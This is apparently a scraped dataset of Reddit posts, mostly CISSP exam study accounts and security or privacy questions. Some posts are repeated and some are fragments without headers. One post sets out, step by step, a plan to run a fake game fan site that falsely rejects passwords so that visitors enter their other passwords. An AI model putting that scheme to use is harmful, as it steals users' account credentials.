I had seriously considered to reschedule the exam date to have more time to prepare, but I'm really glad that I believe in myself and go ahead anyways. Extremely relieved that it's over now!

Find whatever works for you, and go ahead with it!",2021-06-29
826,oa20k3,Passed CISSP first attempt (4 week study),"A little background - I’ve been in the industry for 20 years and have a degree in IT (Network Management and Infrastructure).  I work for a company doing cyber security software integration, testing, and support. Much of what I do is more in the CEH realm and I have a broad background that includes management so all of this certainly helped.  I also own a Technology consulting and support company providing cloud solutions, network architect/implementation services etc.

The company I work for won a contract that requires CISSP certified personnel and I was tasked with getting certified with about 30 days notice.  To their credit, they paid for a one week CED Solutions boot camp and gave me an additional week off (paid) to prepare before the exam.   I didn’t want to let them down so I studied like crazy. If I wasn’t on my computer taking ‘cccure’ practice tests, I was on my phone doing practice quizzes from ‘Pocket Prep.’  If I was driving, I was listening to ‘Mind Map’ and ‘Inside Cloud and Security’ YouTube videos.  

The test is no joke! I felt unprepared going in and throughout the test, I was never confident enough to put money on a passing score. I think this is normal and I knew I was answering more correctly than not. So relieved that I can continue my life and enjoy the summer! I would say the biggest help for me was going through practice exams and thoroughly reading explanations for every answer.  I already knew things like the OSI model, common port numbers, PKI etc. but I still reviewed every explanation as I went through practice questions.  My attitude going in was, I’m not gonna stress over a fail. I planned to study harder and attempt again in 30 days. It didn’t help that my family, coworkers and friends knew I was studying and all wished me luck… that just added pressure I didn’t need. Or maybe I did need the pressure. I’m just glad I passed. Good luck to all in your endeavors!",2021-06-29
827,oa1kel,Requiring bio-metrics for verification?,"In my country, I'm required to provide '100 points of ID' which is sufficient for most things including opening a bank account, or going to court. 

IMO Requiring bio-metrics such as hand-prints or for verification during assessments is not appropriate, both because it's a collection of private information but also because it's not in-line with the security requirement of the exam. I think CISSP needs to reevaluate this option. This is a complete invasion of privacy and not appropriate, make worse so by the fact that NO actual information is provided relating to restrictions or retention on the bio-metrics collected, this is in complete contradiction to the intended content within the damn exam!

What are your thoughts?",2021-06-29
828,oa0x4s,I passed CISSP on my second attempt. Lessons learned,"I finished the exam about four hours ago after a second attempt from a year ago and here’s what I learned. Tl;dr. “Have a plan, Attack!” > “Have a plan: Attack!”

My background: I’ve been working in security for about five years with a background in IT for about 20 years from desktop support to senior engineer/sysadmin roles. Up until today I had one recently expired ITILv3 Foundations and one expired Security+ certification. For each attempt I did about three months of studying.

1. What did I use to study?
The CISSP Official Study guide
The CISSP Official Practice tests (book)
The CISSP study test and exams mobile apps
11th Hour CISSP
Serious Cryptography (not on the exam but a good book for later to explain that stuff)
Cybrary (all respect to Kelly Handerhan but I only made it through the first two domains)
The Shon Harris book (all respect as well but I probably cracked it open twice during my first attempt and that’s it)
YouTube 
    CISSP Exam Cram Playlist (Inside Cloud Security)
    CISSP Mind Maps (Certification Destination)

2. How did I prep and why did I fail the first time?
I gave myself about three months of study time. I used the mobile app and took practice tests in small bursts (10-20 a day). Minimum of 70% on each of the domains
I planned it out three months in advance but didn’t have a plan other than taking the practice tests over and over. I made it a point to mark and highlight the official book (more like small post it notes but had not dived into the book as much. Two weeks before I skimmed through the 11th hr book writing down notes on paper, one domain per page. Admittedly I didn’t have a plan and wanted to get back to grinding towards OSCP. I also thought about the questions as an engineer and not a manager. I was also in a sour mood about it after reading a few job/certification threads on Twitter. Probably anecdotal but who knows. 

3. What I did this time?
So I mentioned OSCP earlier….I’ve put a lot of effort toward it but in between failing and peer pressure from work (something something jump off a cliff and get a CISSP because your coworkers did). Basically the Friday after failing my OSCP….again, I said @#$& it, I’ll just sign up for the exam and knock this out.

The first thing I did was plan out the next three months of how I was going to study.
The whole three months: listen to the aforementioned YouTube playlists over and over. Even in the background while playing video games or while I would go on walks. I not only wrote out a plan but also joined this subreddit and read a bunch of the passed/failed stories and used some of the least common denominators 

March-April: Finish ALL the practice test questions in the book, graded myself on each domain, and took notes for questions I was clueless on I.e. questions I couldn’t find a wrong answer to.
April-May: I used the mobile app (the official one) again, this time taking the tests in larger chunks (50 questions). Sometimes I would do all the domains, or sometimes a couple. No rhyme or reason, just more exposure and taking note of where I needed to study.
May-June: I wanted to get 100% finished with any of the domains on the app but did at least get a minimum of 70% on all the domains. I took notes from 11th hr again except this time I ignored stuff I was already familiar with. 

A week before and during the exam: In addition to all the other notes I wrote down a few notes for things I was still stuck on (formulas, key lengths, etc), but got some good advice from my boss for the exam on eliminating wrong answers: Use the laminated paper you get for the exam to write A,B,C,D and for each question, put an x next to each possible wrong answer. I also wrote down the formulas and other things I made a point to memorize on the exam. Did I run into a lot of those questions? I honestly couldn’t tell you, but I didn’t want it to be a concern. Aside from that I wrote at the top of the paper YOU ARE THE CEO! to set the framework.

As for the exam, I was feeling confident up until about the last thirty questions and was getting that sinking feeling I wasn’t gonna pass but had already made my mind up and planned out what I was gonna do after so to be honest even after passing I walked out the building saying “@##& this exam” to myself. It has to be the first time I was pissed about something positive I did. 

Anyway, aside from planning things out I wanted to give a shout-out to this subreddit for the stories shared. One thing that can be a double edged sword is seeing all the celebratory posts on passing it. 

Work wise it was also much easier to plan and focus when I would see really smart people exercise the knowledge and not treat it like a “checkbox” cert. I loathe the idea of learning out of arbitrary “obligation”.",2021-06-29
829,o9xi77,Passed today @100q,"So, I passed the exam today after finishing 100 questions. I will admit I was shocked but of course overjoyed.

I want to thank everyone here for sharing their experiences and insights as it relates to preparation and more.

I took the exam back in 2016 and failed.. I had taken a boot camp and thought I was ready, but I wasn’t and I didn’t have the right mindset going in. Of course I took the test in the old format so I mentally prepared myself for the new style this go round.

In terms of study….
-I read CISSP for dummies back in September and started flagging areas I needed to do further research on to understand. I identified a study plan and then I tried to stick to that. I wasn’t as strict as I could’ve been during the holidays and beginning of the year, so I had to really buckle down the last month and a half/two months before the exam.

-sunflower: it was okay I mean I read a few times but it just wasn’t for me. Maybe the way the information was setup just couldn’t work for my thought process. But still good to glance at.

-Sybex book: I tried to read cover to cover but it was hard to get through after a while I started using it as reference for things I couldn’t grasp. I did do the practice questions too.

-BOSON: you can’t skip this. While the questions are overly technical they help reinforce and identify what you are weak on. Do each test once and that’s it. If you keep doing them repeatedly you won’t learn anything. Just use them to get a sense of where you are and make adjustments to your study plan accordingly.

-Thor’s courses on Udemy I listed to the audio of the videos to and from work for the last 6 weeks. I took the practice tests at the end of each chapter and at the end of each course.

-CISSP ALL IN ONE  by SHON HARRIS.. I loved this book. Absolutely loved this book because I felt it was easier to read just overall easier to digest. I did practice questions at the ends of each chapter and also read the bullet lists of quick tips at the end to refresh myself the day before the exam. 

-Thor’s hard questions. I purchased them as soon as they were released and took all four. Understand that these are really hard and you will likely score lower here than you have on other practice questions. I will admit I scored horribly but realized there were a few things I was getting confused on and that I really need to take time and review some areas I assumed I just knew because they were directly related to my day to day job. I reviewed them and even found diagrams online to help me better understand. I’m more of a visual person so after a while the text is just gibberish to me. Pictures help a hell of a lot.

-this leads me to cheat sheets. I found Comparitech’s sheets online and found them easier than sunflower to digest. Granted printing some of the domains did the cheat sheets no justice because it was too small to read. I have a large tv screen to view things so for me it was better to read digitally. 

-Kelly Handerhan’s Why You Will Pass the CISSP 10 minute video. I read it before I began my study plan and again this morning before the test. Let me tell you, she reinforces the mindset and encourages you to find that confidence from within to really tackle this exam and come out a winner.

The main thing I would say is find a way that works for you. Books, pictures, video, audio.. whatever. At the end of the day you can do it.. you can pass! Just give yourself time.",2021-06-29
830,o9wzlc,I PASSED CISSP on 2nd TIME!!!,"So, I stumbled upon this group late in my CISSP studies, probably a couple of days ago to be honest.  I had already scheduled the test and only had a few days from discovering this subreddit before I took it.  Even with that short amount of time, some of the resources on this subreddit were extremely helpful!

I took the CISSP exam this morning at 0800, and after around 110 min and 150 questions...I GOT THE GREAT NEWS THAT I PASSED!  I just really wanted to share this with everyone as I am so ecstatic over this accomplishment!

In case anyone wants to know, below are the study materials that I used.

* I attended a boot camp through Infosec Institute.  Was extremely helpful and they also have a pass guarantee where if you do well in the class but do not do well on the test, you can retake the bootcamp and test without extra charges. 10/10
* Boson Ex-Sim Max - EXTREMELY helpful with explaining why things were the way that they were.  Unfortunately, I remember questions well, so after taking multiple tests through the Boson software I was recognizing questions, but still, would recommend 8/10.
* Wiley Test Bank - Basically the same as Boson, not as informative as to why answers were the right answers, but has a huge test bank and I did not see many questions multiple times. 7/10
* Eleventh Hour - I really enjoyed the summarization that this book used to explain different concepts throughout the Sybex text.  I read it twice through leading up to the test. 8/10
* CISSP Sunflower Summary - A couple days before the test, I read this all the way through while also taking practice tests for each domain as I read through them.  A very good summary of information, but don't use as your ONLY study guide. 6/10
* The CISSP Mindmap Videos by Rob Witcher - Extremely helpful and nice to listen to while I was driving in the car.  A lot of information crammed into short videos, but still helped me solidify some information. 7/10
* Kelly Handerhan Why you will pass the CISSP - CAN'T STRESS THIS ENOUGH, this video was extremely helpful on understand what mindset to have when you are going to take the test.  I listened to this at LEAST 4 times leading up to the test.  Don't think I would have passed without it. 10/10

I am sure there were some more sources that I used, but these were the primary sources.  My biggest advice, don't just take practice tests and questions over and over.  They are helpful, but way more helpful when you understand WHY the answers are the actual answers.

Good Luck to everyone!",2021-06-29

833,o9m7p4,1st Attempt: Passed at Q101 ~100 minutes,"Morning All - 

Took and passed the CISSP this morning on my first attempt. If I can pass it on my first attempt, then any of you can. It took me around 100 minutes and 101 questions.

Like many have posted here before, the exam provided many challenging questions, and it felt like I was in the ring with Mike Tyson for 12 rounds. When the screen went blank after Q101 I was pretty nervous that I failed, because I did not feel that I was doing THAT well. However, I passed. Below is a little about me and how I prepared.

Of Note: It is key to remember that there are ""Developmental Questions"" embedded. Seeing those provided some challenges, but if you see some questions out of the ordinary or seem like content you did not see in your studies, do not worry. Additionally, I took the approach of the CAT is here to help. It is here to keep you from failing by providing questions to keep you at/near a passing score. I believe that mentally helped significantly.

# Relevant background:

* **BSc in Computer Science** from the University of Manchester
* 5 yrs at **Cisco** working on threat intelligence
* 1 yr at **CyberArk** as Security PMO for R&D
* 1 yr at **Deloitte** as a Senior Cybersecurity Consultant
* 2 yrs at **Microsoft** as a Senior Content Developer for Azure security products

I started looking into CISSP in my time at CyberArk but only really kicked off my proper studying 8 months ago.

# Resources I used:

|Resource|Format/location|Notes|
|:-|:-|:-|
|How To Think Like A Manager for the CISSP Exam (Ahmed, Luke)|Kindle edition|Read cover to cover. I found the advice and framing very helpful. (8/10)|
|CISSP Official Study Guide, 8th edition |Physical book|Read first 100 pages then used as reference. I found the style a little dry, the size intimidating, and the content occasionally lacking - a few times I came to this subreddit in frustration about missing topics. (6/10)|
|CISSP Official Study Guide, 8th edition |Digital edition (via [oreilly.com](https://oreilly.com))|This was where I consumed more of the OSG and a full-text search of a book is SO much more useful than an index which only has partial coverage. (7/10) |

|CISSP Course by Shon Harris |Videos (via [oreilly.com](https://oreilly.com)) |I found it insufferable how she began EVERY SINGLE short video with the word 'Now'. Couldn't listen after I noticed this behavioural tic. (1/10) |
|CISSP, Second Edition by Sari Greene|Videos (via [oreilly.com](https://oreilly.com)) |She suffers from the same verbal tic as Shon Harris: an overreliance on the word ""Now"" as a way to start a sentence or segway between ideas. It's really annoying after a very short time and so I had to quit after lesson 6. She also can't say ""hierarchical"" (but repeatedly does so, leaving out the second 'c'). (3/10) |
|Kelly Handerhan's cybrary course |Cybrary|Excellent. (8/10) |

|Larry Greenblatt's ""CISSP 2020 Exam Tips""|YouTube|Superb! Watched this on the day of the exam and it really helped solidify the mindset. (10/10)|
|Darknet Diaries |Podcast by Jack Rhysider |Jack's got an interesting way of presenting stories and they're often a good application of the issues covered in the study material. Occasionally, he comes across as a little *too* disappointed that the criminals he's covering get punished. (7/10)|

# Thoughts on the value of this whole process:

I've read a lot of negativity about the cert. Plenty of people (including current CISSP holders) who really don't think it's worth the paper it's printed on. At times, it certainly feels more like a money-making operation than a real 'test' of your knowledge. The annual fee of $125 also feels very steep, and unrelated to the goals. The fact that it's payable in the first year when they've already had $700 for the exam also feels pretty unreasonable.

I wasn't impressed with the quality of the questions in the exam. One in particular had a typo that enormously impacted the meaning of the question. I can't go into details, but the way it was written made no sense and I had to infer the intention. I noted it for reporting afterwards but I was too pumped up from the end of the test to actually do anything on the day. 

So now I have my provisional pass, and I'll have to pay my annual subs, and the exam scraped the surface of my knowledge, but was it worth it? I genuinely think I'll only be able to answer that with the benefit of hindsight a few years from now.",2021-06-27

1. any sites using 2FA with SMS might require a replacement AT&T sim card that I won't be able to get in a foreign country
2. any sites using 2FA with an authenticator app (google authenticator, authy, etc), will leave me stuck without my phone

What would you consider best practice to handle this, particularly if you have to travel where it would be awkward to carry backup paper QR codes/etc. Also feel like it would be risky to carry around QR codes like that.

870,osgjtk,Writing Cybersecurity into Mystery Novels,"I'm an author. It's popular today for people to set their whodunnit mysteries back in the interwar period when Golden Age mystery fiction was written, or even earlier. This is partially a callback to the greatest mystery writers of all time, who wrote stories set in that period, and a way to avoid considering the effect modern technology would have on their sleuth.

But what's missed here, in my view, is that those writers weren't trying to hide from modernity. They were just setting their stories in their own society. Further, readers nowadays are too far removed from Victorian society to notice that heroes like Sherlock Holmes were in fact introducing the audience to chemistry and forensics that was cutting-edge at the time.

So as I start my first series set in the modern day (having previously written a few standalones and a historical series) I want to avoid shying away from the effects of the most modern technology on crime.

874,omwnv0,Having a hard time investigating/recovering from server hack," Hi everyone. For context: I'm a sysadmin with a decent understanding of offensive hacking, and I run a few LAMP servers on DigitalOcean for personal niche websites and a few clients' websites. A couple months ago I put all my domains on a bug bounty (openbugbounty org) to help me identify weaknesses as I continue growing. (I've had only minor exploits mentioned, and most of the researchers violate the rules I wrote, ie. dont attack subdomains, don't report self-xss, etc ). Since this started, I would occasionally see my MYSQL server drop, maybe twice a month. I would reboot my server and all would be well (in retrospect I see how dumb this attitude was). I've also begun getting a TON of log traffic, as one would expect.

Here's where I make a huge embarrassing mistake; I decided to use my main production server to host the development environment for a new version of a CMS I wrote in PHP/MySQL. I was working on dev(.)mysite(.)com, which was on the same server as mysite(.)com, and used the same MySQL server. I really can't explain my thinking on this one. At my 9-5 I'm very strict about having the developers keep dev and production environments separate, so this is out of character for me. I guess my level of security-consciousness is proportional to the amount of explaining I'll have to do.

About a week or ago I find my CMS won't allow me to login. I checked the DB and there are hundreds and hundreds of new entries in the *users* table. Interestingly, the user account I was trying to login with looked untouched. I obviously got caught slipping with a SQLi vulnerability. No other tables were affected that I know of, as this CMS uses an un-privileged DB account. I shut the dev site down, and moved it to a local LAMP server on my home network. Better late than never. Now I'm trying to figure out what happened, and how far the breach went.

I have over 1,000 log files in /var/log/apache2, and most other directories in /var/log/ are also packed to the gills. There's too much noise (presumably) from the bug bounty for me to analyze anything. I spent a day writing python scripts to analyze stuff. I have one that compiles all website-specific logs into respective master files, and runs scalp.py on them, outputting everything to an HTML file I can navigate. There's so many random injection attempts that the script is almost useless to me. I wrote another script to analyze the /var/log/auth.log file and at least count and sort the types of messages. The output can be found [https://pastebin.com/grGhT0Qx](https://pastebin.com/grGhT0Qx) . Sorry if the output is confusing, I don’t understand what a lot of the messages mean, so just did a basic count for now.

I only saw on single SSH login that I didn't recognize, and it was on the account smmsp. This also lead me to see in my mail log files that somebody had found an old forum install I forgot about, and had been using it to send massive amounts of spam emails to email addresses in Russia. I've removed the account, the forum, and uninstalled sendmail.

I'm at the point of the investigation where I risk going down the wrong path and wasting valuable time.

So here’s my questions:

1. Are there any programs that will do an in-depth audit of my logs? I did a bunch of searching, but almost nothing fits the bill besides scalp.py, and that’s only for website-specific log files. I’m more than happy to expand my own scripts to do this if I need to, but would request someone push me in the direction of the information I need to start studying.
2. Is there an application that could blacklist an IP address if it recognizes injection attempts? I’m sure a WAF could pull something like this off, but have never used any so I would be swinging in the dark by picking one. I can write a script to do it too, using the logs to identify IPs, but is there a specific method of blacklisting that I should be leaning towards if I need to do this on my own?

877,ojr8ka,Banks Blocking Anonymous VPN Providers and Fraud Question,"Hi everyone.

I noticed banks are increasing the blocking of anonymizer VPN providers to deter fraud. When connecting from a VPN, the bank may block the login attempt, prompt the login process with a security question/answer, or in some more extreme cases, disable or close the account requiring the affected user to go into a branch to verify their identity with bank staff. 

I understand why this is occurring with the increased fraud. However, my question is, what are the back-end providers banks are using to monitor for, detect, and prevent log-on from VPN providers?

Google research suggests several banks and financial providers use a company called Maxmind ([https://www.maxmind.com/en/home](https://www.maxmind.com/en/home)).

881,oi3wll,Is it a good idea to use 1 email address per company you interact with?,"My email was leaked, so of course I started getting massive amounts of spam. I also got a new type of spam: subscription spam, which is where bots sign you up for 100s of newsletters that don't have captchas or anything. Newsletters are much less likely to be auto marked as spam so they often go straight to inbox.

Anyway that email address nearly unusable until I spent a bunch of time cleaning it up. This got me wishing I could've just dumped the email address and moved on (I couldn't do that since it was tied to too many things).  Imagine if I could have just updated the email address on 1 website- problem solved. That also helps security, I think-- if someone steals one of your email accounts, the worst they can do is log into 1 company.

The main problem I can see with this approach is that it is kind of difficult to maintain dozens of email addresses. I'm pretty sure Google auto deletes gmail accounts after 1-2 years of you not logging in. So you'd need to manually log into each email address occasionally. Also if you are talking to customer service and they ask you for your email address, you might not be able to remember unless you follow an obvious naming convention.

888,oc5jlt,Never Seen Anyone Report this Security Flaw in the Last 40 Years?,"(Note this is an edit, to hopefully better explain what I was talking about here).

Phishing is very common, and not only that, very easy to detect.   Someone sends you an email that attempts to get you to click a link that will send you to a site that looks like the login screen for a popular site like Ebay, Amazon, Microsoft, etc.

What I have never seen discussed very often at all in the last 40 years or talked about is another possible security flaw.   What if someone purposely sets up a real website.   Key word is real.   Not a phish, not a fake, not a copy of a popular site.   Instead they set up a real site and this site is run by a hacker or a group of hackers.

A  hacker could use this trick:  They create a legitimate website.   Say a  computer gaming website.   They require people to create an account to  access the website, where people have to enter an email and a password.    They delete or edit the password file, so that people trying to login,  will see, your password is incorrect and get a message ""try again"".     So someone trying to login to the legitimate website, will ""cycle thru  all their passwords"".

A possible ""real"" scenario of someone trying this:    For example, if you want to hack into Steam accounts, this is how I would do it:   1st) Get a list of upcoming planned to be released games on Steam,  2nd) Check for a soon to be released game where there are no fan websites yet,   3rd) Create a fan website for the upcoming to be released game  (prior to the games release date),    4th) Make sure you require people to create an account to use your fan site, 5th) Now after the game is released, people buy it and may search for information on how to play the game, and they will go to your site and type in an email and password to create their account, 6th) You as the hacker and site administrator, do what I suggested in the paragraph prior to this one.

This is just an example scenario.   The security flaw, is that phishing is VERY easy to detect, but how would you know if your favorite site  (think of any site you visit every day), is actually being run by a hacker or group of hackers?     Maybe when you go to search for information on the game that you just purchased, that site is being run by a hacker.

Phishing is very easily detectable.   But how would you detect if it is actually a real site?   How would you know that this real site is being run by a hacker or group of hackers?    This is the crux of the matter and where there is some security risk if people don't consider this could happen.",2021-07-02

Main concerns:

1. any sites using 2FA with SMS might require a replacement AT&T sim card that I won't be able to get in a foreign country
2. any sites using 2FA with an authenticator app (google authenticator, authy, etc), will leave me stuck without my phone

- I just ordered 2 yubikeys, but not all sites support these where I can get totally locked out
- I could buy a cheap android phone, and regenerate 2FA QR codes on all sites that I use them, and setup both my primary iPhone and backup Android authenticator apps to have the OTP's available

It's popular today for people to set their whodunnit mysteries back in the interwar period when Golden Age mystery fiction was written, or even earlier. This is partially a callback to the greatest mystery writers of all time, who wrote stories set in that period, and a way to avoid considering the effect modern technology would have on their sleuth.

But what's missed here, in my view, is that those writers weren't trying to hide from modernity. They were just setting their stories in their own society. Further, readers nowadays are too far removed from Victorian society to notice that heroes like Sherlock Holmes were in fact introducing the audience to chemistry and forensics that was cutting-edge at the time.

So as I start my first series set in the modern day (having previously written a few standalones and a historical series) I want to avoid shying away from the effects of the most modern technology on crime.

919,omwnv0,Having a hard time investigating/recovering from server hack," Hi everyone. For context: I'm a sysadmin with a decent understanding of offensive hacking, and I run a few LAMP servers on DigitalOcean for personal niche websites and a few clients' websites. A couple months ago I put all my domains on a bug bounty (openbugbounty org) to help me identify weaknesses as I continue growing. (I've had only minor exploits mentioned, and most of the researchers violate the rules I wrote, ie. dont attack subdomains, don't report self-xss, etc ). Since this started, I would occasionally see my MYSQL server drop, maybe twice a month. I would reboot my server and all would be well (in retrospect I see how dumb this attitude was). I've also begun getting a TON of log traffic, as one would expect.

Here's where I make a huge embarrassing mistake; I decided to use my main production server to host the development environment for a new version of a CMS I wrote in PHP/MySQL. I was working on dev(.)mysite(.)com, which was on the same server as mysite(.)com, and used the same MySQL server. I really can't explain my thinking on this one. At my 9-5 I'm very strict about having the developers keep dev and production environments separate, so this is out of character for me. I guess my level of security-consciousness is proportional to the amount of explaining I'll have to do.

About a week or ago I find my CMS won't allow me to login. I checked the DB and there are hundreds and hundreds of new entries in the *users* table. Interestingly, the user account I was trying to login with looked untouched. I obviously got caught slipping with a SQLi vulnerability. No other tables were affected that I know of, as this CMS uses an un-privileged DB account. I shut the dev site down, and moved it to a local LAMP server on my home network. Better late than never. Now I'm trying to figure out what happened, and how far the breach went.

I have over 1,000 log files in /var/log/apache2, and most other directories in /var/log/ are also packed to the gills. There's too much noise (presumably) from the bug bounty for me to analyze anything. I spent a day writing python scripts to analyze stuff. I have one that compiles all website-specific logs into respective master files, and runs scalp.py on them, outputting everything to an HTML file I can navigate. There's so many random injection attempts that the script is almost useless to me. I wrote another script to analyze the /var/log/auth.log file and at least count and sort the types of messages. The output can be found [https://pastebin.com/grGhT0Qx](https://pastebin.com/grGhT0Qx) . Sorry if the output is confusing, I don’t understand what a lot of the messages mean, so just did a basic count for now.

I only saw on single SSH login that I didn't recognize, and it was on the account smmsp. This also lead me to see in my mail log files that somebody had found an old forum install I forgot about, and had been using it to send massive amounts of spam emails to email addresses in Russia. I've removed the account, the forum, and uninstalled sendmail.

I'm at the point of the investigation where I risk going down the wrong path and wasting valuable time.

So here’s my questions:

1. Are there any programs that will do an in-depth audit of my logs? I did a bunch of searching, but almost nothing fits the bill besides scalp.py, and that’s only for website-specific log files. I’m more than happy to expand my own scripts to do this if I need to, but would request someone push me in the direction of the information I need to start studying.
2. Is there an application that could blacklist an IP address if it recognizes injection attempts? I’m sure a WAF could pull something like this off, but have never used any so I would be swinging in the dark by picking one. I can write a script to do it too, using the logs to identify IPs, but is there a specific method of blacklisting that I should be leaning towards if I need to do this on my own?

922,ojr8ka,Banks Blocking Anonymous VPN Providers and Fraud Question,"Hi everyone.

I noticed banks are increasing the blocking of anonymizer VPN providers to deter fraud. When connecting from a VPN, the bank may block the login attempt, prompt the login process with a security question/answer, or in some more extreme cases, disable or close the account requiring the affected user to go into a branch to verify their identity with bank staff. 

I understand why this is occurring with the increased fraud. However, my question is, what are the back-end providers banks are using to monitor for, detect, and prevent log-on from VPN providers?

Google research suggests several banks and financial providers use a company called Maxmind ([https://www.maxmind.com/en/home](https://www.maxmind.com/en/home)). 

Does anyone know of any other back-end providers used to detect fraud during the log-on process?

926,oi3wll,Is it a good idea to use 1 email address per company you interact with?,"My email was leaked, so of course I started getting massive amounts of spam. I also got a new type of spam: subscription spam, which is where bots sign you up for 100s of newsletters that don't have captchas or anything. Newsletters are much less likely to be auto marked as spam so they often go straight to inbox.

Anyway that email address nearly unusable until I spent a bunch of time cleaning it up. This got me wishing I could've just dumped the email address and moved on (I couldn't do that since it was tied to too many things).  Imagine if I could have just updated the email address on 1 website- problem solved. That also helps security, I think-- if someone steals one of your email accounts, the worst they can do is log into 1 company.

The main problem I can see with this approach is that it is kind of difficult to maintain dozens of email addresses. I'm pretty sure Google auto deletes gmail accounts after 1-2 years of you not logging in. So you'd need to manually log into each email address occasionally. Also if you are talking to customer service and they ask you for your email address, you might not be able to remember unless you follow an obvious naming convention.

933,oc5jlt,Never Seen Anyone Report this Security Flaw in the Last 40 Years?,"(Note this is an edit, to hopefully better explain what I was talking about here).

Phishing is very common, and not only that, very easy to detect.   Someone sends you an email that attempts to get you to click a link that will send you to a site that looks like the login screen for a popular site like Ebay, Amazon, Microsoft, etc.

What I have never seen discussed very often at all in the last 40 years or talked about is another possible security flaw.   What if someone purposely sets up a real website.   Key word is real.   Not a phish, not a fake, not a copy of a popular site.   Instead they set up a real site and this site is run by a hacker or a group of hackers.

A  hacker could use this trick:  They create a legitimate website.   Say a  computer gaming website.   They require people to create an account to  access the website, where people have to enter an email and a password.    They delete or edit the password file, so that people trying to login,  will see, your password is incorrect and get a message ""try again"".     So someone trying to login to the legitimate website, will ""cycle thru  all their passwords"".

A possible ""real"" scenario of someone trying this:    For example, if you want to hack into Steam accounts, this is how I would do it:   1st) Get a list of upcoming planned to be released games on Steam,  2nd) Check for a soon to be released game where there are no fan websites yet,   3rd) Create a fan website for the upcoming to be released game  (prior to the games release date),    4th) Make sure you require people to create an account to use your fan site, 5th) Now after the game is released, people buy it and may search for information on how to play the game, and they will go to your site and type in an email and password to create their account, 6th) You as the hacker and site administrator, do what I suggested in the paragraph prior to this one.

This is just an example scenario.   The security flaw, is that phishing is VERY easy to detect, but how would you know if your favorite site  (think of any site you visit every day), is actually being run by a hacker or group of hackers?     Maybe when you go to search for information on the game that you just purchased, that site is being run by a hacker.

Phishing is very easily detectable.   But how would you detect if it is actually a real site?   How would you know that this real site is being run by a hacker or group of hackers?    This is the crux of the matter and where there is some security risk if people don't consider this could happen.",2021-07-02

In practice (I know that *in theory* every password you use should be long and complex), the strength of your passwords is dependent on what additional layers of protection are available, if any.

Personally, I need to remember at least five unique passwords. Some are very long diceware passwords, while others are substantially shorter and easier to remember. How much I'm willing to give up in terms of security in exchange for ease of use depends on whether those passwords stand completely alone without any additional layers of protection (as an example, the password I use to sign into my main cloud account is long and complex and 2FA isn't enabled - I wanted a scenario where I know I can always log into this account, even if I were to lose my phone and laptop at the same time or something else happened that made my 2FA codes unrecoverable).

I recently enabled Bitlocker drive encryption and would like to switch from using a local account password to a local PIN backed by TPM. Because two new layers of security have been introduced on my machine - the Bitlocker drive encryption and the TPM backing available to PINs - I was considering using something easier to type and remember as my PIN, since my current local account password is a pain to type. I feel like a PIN in this scenario can afford to be shorter and less complex because of that TPM backing and lockout threshold - I just don't know how much less secure.

On some better secured (i guess FLAG_SECURE was used more info https://wwws.nightwatchcybersecurity.com/2016/04/13/research-securing-android-applications-from-screen-capture/ ) app was not recorded, screen become black, unfortunately samsung keyboard was still visible, so password could be still obtained.

One of the bank app was clear winner here, bacause it does not use samsung keyboard, it has own keyboard in application, so whole screen was black.

What do you think? Am i too paranoid? Should i ask bank for improving app?

961,ouvuiy,"Bought a Smart Google TV with a built-in mic (on the unit, not the remote). What should I do to protect my audio privacy?","**The entirety of my privacy concerns (with regards to a smart TV) amounts to this: I don't want hackers, or Google, listening to my conversations.** That's it. I personally don't care about companies tracking what content I watch or what games I play, as there isn't any information there that would be of interest to anyone. I'm not interested in arguing about what my privacy concerns should be. I'm just looking for advice on the microphone issue.

The TV I bought is a 2021 Sony Bravia X90J with Google TV. I plan on using the Google TV OS for watching YouTube and Hulu, and for sideloading Android apps. I bought this particular model for its excellent 4K HDR display and HDMI 2.1 support which I'll need to get the most out of my Xbox Series X. I was initially led to believe that the only microphone was on the remote, which I could disable by turning Bluetooth off, as that is how the [audio is transmitted](https://www.sony.com/electronics/support/televisions-projectors-lcd-tvs-android-/xr-65x90j/articles/00171448). But after looking more closely at the [documentation](https://www.sony.co.in/electronics/support/televisions-projectors-lcd-tvs-android-/xr-55x90j/articles/00201366), I've realized that there is actually a mic on the TV itself, for ""hands-free voice controls"". While this is concerning, very few TVs in my budget have HDMI 2.1 support and a well-rated display, which are my main criteria.

There is a switch to turn the mic off, and of course I plan on disabling Google Assistant and configuring all of the privacy settings on the TV to my liking. But that's all software-related, and I've heard stories of microphones being turned on remotely, which disturbs me.

Here are some safety measures that I've thought of based on discussions I've read online:

* As I've said already, disabling the mic using the button and disabling all audio features
* Having a secure WiFi password that's unlikely to be cracked
* Attaching a Pi-Hole to the network? (I'm tech-savvy enough to make one and set it up, but I don't exactly know why it's necessary or how it would help, I've just seen it mentioned a bunch.)
* Making a separate Google account so that my voice isn't tied to my identity
* (Last resort, if it's still insecure): disabling WiFi, making it a ""dumb TV"" and using other devices for streaming (although I really would have liked to sideload Android apps without having to get an extra box)

Will these be enough? Is there anything else I should do? Are some of these unnecessary? Thanks for your input.",2021-07-30

Some constraints:

- I'm a full time backpacker with no home. If my things are lost/stolen, flying to a friend/relative to get my backup disk would cost too much money and the data might be too old. So I must use cloud to store my backups. 

- I don't trust any password managers, cloud providers, Apple, Google and such. Maybe they are nice today but I'm not sure what they or government would do 30 years later. I trust whatever I have control over; open source software that runs on my machine. 

Here's the design draft

> Pw0 for cloud1, cloud2
> 
> Pw0 for email account associated to clouds. Email account is created because cloud providers ask for it
> 
> Pw1 for vault1 - It has passwords, cards (purpose of separating v1 and v2 is to keep v1 usually locked)
> 
> Pw1 for vault2 - It has everything else 
> 
> Pw2 for encryption of zip file - I will access this from an untrusted computer/phone after my things are stolen. This device could belong to a hotel, stranger or police. It has things to help me prove my ID and access money to buy local clean phone and computer so I can access all vaults and continue my life as if nothing happened. Zip because I might not able to install the software to unlock a vault.
> 
> That's it. I just need to remember 3 passwords. Vaults and zip are encrypted and synced to clouds. First cloud works with Cryptomator and syncs instantly when there's connection. Second cloud works with an *alternative* to Cryptomator (in case of data corruption, Cryptomator software bug) and syncs *once a month* (in case instant sync fails and also kind of as an older backup). I don't remember needing versioning in backups in last 15 years. *Two clouds* because one's domain could be blocked by the local government or could lock me out or its software might fail to work when I need it to work.

> As for PW management: I use incognito browser, pay attention to SSL and domain, clear the clipboard after I copy paste a sensitive password. Using a PW manager software safely would increase complexity (gotta back that up too) and I'm not sure if I want that. I think I could keep a text file of bank, broker, government account passwords and credit card info in vault1. I'd enter passwords from computer screen to my phone manually.

